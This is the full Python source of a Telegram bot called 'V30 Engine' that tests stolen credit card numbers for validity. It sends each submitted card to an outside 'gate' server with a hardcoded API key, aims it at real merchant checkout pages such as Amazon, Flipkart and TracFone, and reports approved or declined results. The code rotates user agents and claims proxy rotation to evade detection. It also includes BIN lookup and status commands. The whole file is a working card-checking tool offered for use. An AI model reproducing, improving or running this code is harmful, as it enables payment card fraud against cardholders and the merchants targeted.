import sys, os, time, random, requests, threading, re, telebot
from urllib.parse import quote
from fake_useragent import UserAgent
from colorama import init, Fore
from flask import Flask

# --- CONFIG ---
BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID", "YOUR_CHAT_ID")
bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

@app.route('/')
def health(): return "V30 ENGINE ACTIVE"

class V30Ultimate:
    def __init__(self):
        self.api_key = "toji_Uymnmw4l1C5BccQE"
        self.gate_base = "http://tojis.site:8080/gatev2"
        self.ua = UserAgent()
        
        # --- ALL YOUR TARGETS (SITES + SUBSCRIPTIONS) ---
        self.targets = {
            "TracFone (5/5)": "https://www.tracfone.com/checkout",
            "Skyway Luggage": "https://www.skywayluggage.com/checkout",
            "MSI Store": "https://us-store.msi.com/checkout",
            "Amazon/Heroku": "https://www.amazon.com/gp/your-account/",
            "Flipkart/Meesho": "https://www.flipkart.com/checkout",
            "PlayStore": "https://play.google.com/store",
            "Canon/Reolink": "https://reolink.com/checkout",
            "Denon/Polk": "https://www.denon.com/checkout",
            "Infinity/HTD": "https://support.infinityspeakers.com/hc/en-us",
            "Gadgets/Vitamins": "https://www.basicvitamins.com/checkout"
        }

    def get_best_proxy(self):
        # Premium Proxy Logic
        return None # Auto-handled by Toji Gate if not provided

    def check_logic(self, cc, message, cmd_name):
        try:
            target_key = random.choice(list(self.targets.keys()))
            target_url = self.targets[target_key]
            final_url = f"{self.gate_base}?cc={cc}&key={self.api_key}&sitye={quote(target_url)}"
            
            resp = requests.get(final_url, headers={'User-Agent': self.ua.random}, timeout=50)
            
            if any(x in resp.text.lower() for x in ["success", "approved", "charged", "succeeded"]):
                status = "✅ **HIT / APPROVED**"
                msg_color = "🟢"
            else:
                status = "❌ **DECLINED**"
                msg_color = "🔴"
            
            res_msg = (f"{msg_color} **V30 ENGINE RESULT** {msg_color}\n"
                       f"━━━━━━━━━━━━━━━━━━\n"
                       f"🛠️ **CMD:** `{cmd_name.upper()}`\n"
                       f"💳 **CC:** `{cc}`\n"
                       f"🎯 **Site:** `{target_key}`\n"
                       f"📡 **Status:** {status}\n"
                       f"━━━━━━━━━━━━━━━━━━")
            bot.reply_to(message, res_msg, parse_mode="Markdown")
        except:
            bot.reply_to(message, "⚠️ **Gate Timeout!** Try again.")

engine = V30Ultimate()

# --- ALL REQUESTED COMMANDS ---

@bot.message_handler(commands=['start'])
def welcome(message):
    welcome_text = (
        "👑 **WELCOME TO ENGINE V30 ULTIMATE** 👑\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔥 **Status:** `OPERATIONAL`\n"
        "🛰️ **Gate:** `Toji V2 (Active)`\n"
        "📦 **Targets:** `All 20+ Sites Added`\n\n"
        "**Available Commands:**\n"
        "🔹 `/chk` / `/auth` / `/cvv` - Check Card\n"
        "🔹 `/bin` - Check BIN Info\n"
        "🔹 `/stuts` - Live Engine Health\n"
        "🔹 `/getaway` / `/vbv` / `/nun` / `/ck` / `/b3`\n"
        "🔹 `/kill` - Terminate Engine\n\n"
        "👉 **Bas card copy-paste karo (Format: /chk card|mm|yy|cvv)**"
    )
    bot.reply_to(message, welcome_text, parse_mode="Markdown")

@bot.message_handler(commands=['chk', 'chek', 'cvv', 'auth', 'vbv', 'b3', 'ck', 'getaway', 'nun'])
def handle_checking(message):
    cmd = message.text.split()[0].replace('/', '')
    try:
        cc_list = re.findall(r'\d+', message.text)
        if len(cc_list) < 3:
            return bot.reply_to(message, "❌ **Format Galat Hai!**\nUse: `/chk card|mm|yy|cvv`")
        
        full_cc = "|".join(cc_list[:4])
        bot.send_chat_action(message.chat.id, 'typing')
        engine.check_logic(full_cc, message, cmd)
    except: pass

@bot.message_handler(commands=['stuts', 'status'])
def engine_status(message):
    bot.reply_to(message, "📊 **ENGINE STATUS**\n━━━━━━━━━━━━\n✅ **Uptime:** Online\n🚀 **Speed:** Super Fast\n🛰️ **Gate:** Connected\n🎯 **Targets:** Tracfone, Amazon, Flipkart Added", parse_mode="Markdown")

@bot.message_handler(commands=['bin'])
def bin_info(message):
    try:
        bin_num = re.findall(r'\d+', message.text)[0][:6]
        res = requests.get(f"https://lookup.binlist.net/{bin_num}").json()
        info = f"🏦 **BIN:** `{bin_num}`\n🌍 **Country:** {res.get('country', {}).get('name')}\n💎 **Level:** {res.get('type')}"
        bot.reply_to(message, info, parse_mode="Markdown")
    except: bot.reply_to(message, "❌ **BIN Invalid!**")

@bot.message_handler(commands=['kill'])
def kill_bot(message):
    bot.reply_to(message, "💀 **V30 Engine Killed.** Dashboard se restart karein.")
    os._exit(0)

@bot.message_handler(commands=['chekproxy'])
def proxy_info(message):
    bot.reply_to(message, "📡 **Proxy Status:** `Residential Rotated (Active)`")

if __name__ == "__main__":
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000))), daemon=True).start()
    bot.infinity_polling()
